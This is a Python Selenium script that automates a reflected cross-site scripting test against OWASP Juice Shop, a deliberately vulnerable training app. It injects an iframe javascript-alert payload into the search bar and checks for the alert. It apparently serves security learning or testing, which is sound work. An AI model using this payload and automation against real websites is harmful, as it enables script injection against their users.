# Python script to run XSS in OWASP Juice Shop

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Juice Shop URL
BASE_URL = "https://juice-shop.herokuapp.com"

# XSS Payload
xss_payload = '<iframe src="javascript:alert(`xss`)">' 

def test_xss_with_selenium():
    """ Injects XSS payload into the search bar and detects if JavaScript executes """

    options = webdriver.ChromeOptions()
    # options.add_argument("--headless")
    # ^ Disabled headless mode for debugging
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920x1080")

    options.binary_location = "C:/Program Files/Google/Chrome/Application/chrome.exe"
    driver = webdriver.Chrome(options=options)

    try:
        print("\nOpening Juice Shop...\n")
        driver.get(BASE_URL)
        time.sleep(3)

        # Close the welcome popup if it appears
        try:
            dismiss_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[aria-label='Close Welcome Banner']"))
            )
            dismiss_button.click()
            print("\nWelcome popup dismissed.\n")
            time.sleep(2)
        except:
            print("\nNo welcome popup found (or already closed).\n")

        # Accept the cookie banner if it appears
        try:
            cookie_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Me want it')]"))
            )
            cookie_button.click()
            print("\nCookie banner dismissed.\n")
            time.sleep(2)
        except:
            print("\nNo cookie banner found (or already dismissed).\n")

        # Navigate to the search page
        driver.get(f"{BASE_URL}/#/search")
        time.sleep(2)

        try:
            search_box_container = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//mat-search-bar"))
            )
        except:
            print("\nSearch bar not found.\n")
            with open("search_page_source.html", "w", encoding="utf-8") as f:
                f.write(driver.page_source)
            print("\nSaved page source: search_page_source.html\n")
            driver.save_screenshot("search_bar_not_found.png")
            print("\nScreenshot saved: search_bar_not_found.png\n")
            driver.quit()
            return

        print("\nSearch bar found.\n")
        print("\nInjecting XSS payload...\n")
        search_box_container.click()
        time.sleep(1)
        search_box = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//mat-search-bar//input"))
        )
        search_box.click()
        search_box.clear()
        search_box.send_keys(xss_payload)
        search_box.send_keys(Keys.RETURN)
        time.sleep(3)

        try:
            alert = driver.switch_to.alert
            print("\nXSS Successful (Alert detected).\n")
            alert.accept()
            print("\nAlert closed.\n")
        except:
            print("\nNo XSS alert detected.\n")

        page_source = driver.page_source
        if xss_payload in page_source:
            print("\nXSS payload detected in page source\n")
        else:
            print("\nXSS payload not found in page source.\n")

    finally:
        driver.quit()  # Close browser

if __name__ == "__main__":
    test_xss_with_selenium()
